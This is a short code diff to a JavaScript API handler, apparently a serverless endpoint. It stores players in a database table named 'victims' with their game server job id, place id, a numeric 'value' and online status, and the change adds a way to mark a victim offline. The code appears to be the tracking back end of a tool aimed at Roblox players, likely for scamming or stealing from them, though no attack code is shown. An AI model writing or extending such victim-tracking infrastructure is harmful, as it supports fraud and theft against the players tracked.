@@ -27,10 +27,20 @@ export default async function handler(req, res) {
   const jobId    = req.body?.jobId    || "";
   const placeId  = req.body?.placeId  || "";
   const value    = parseInt(req.body?.value || "0") || 0;
+  const offline  = req.body?.offline === true;
   const now      = Date.now();
 
   try {
     await ensureTable();
+
+    if (offline) {
+      await sql`
+        UPDATE victims SET status = 'offline', job_id = ''
+        WHERE player = ${player}
+      `;
+      return res.status(200).json({ ok: true, action: "set_offline" });
+    }
+
     await sql`
       INSERT INTO victims (player, status, job_id, place_id, value, last_seen)
       VALUES (${player}, 'online', ${jobId}, ${placeId}, ${value}, ${now})
